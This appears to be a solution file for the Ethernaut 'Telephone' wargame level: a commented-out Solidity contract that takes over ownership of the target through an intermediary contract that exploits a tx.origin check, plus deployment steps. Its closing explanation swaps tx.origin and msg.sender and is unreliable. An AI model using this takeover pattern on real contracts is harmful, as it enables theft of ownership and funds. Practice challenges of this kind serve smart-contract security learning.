/*
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneAttack {

  Telephone telephoneContract;

    constructor(address _address) public {
        telephoneContract = Telephone(_address);
    }

    function attack(address _address) public {
        telephoneContract.changeOwner(_address);
    }
}
*/

//Entire file commented to prevent compiler version and import errors. This contract was deployed using remix browser editor.
//Deploy w/ ethernaut contract instance address as constructor arg.
//Call attack function w/ wallet as address.
//Attack will succeed because tx.origin will be attacking contract address rather than wallet that will take ownership.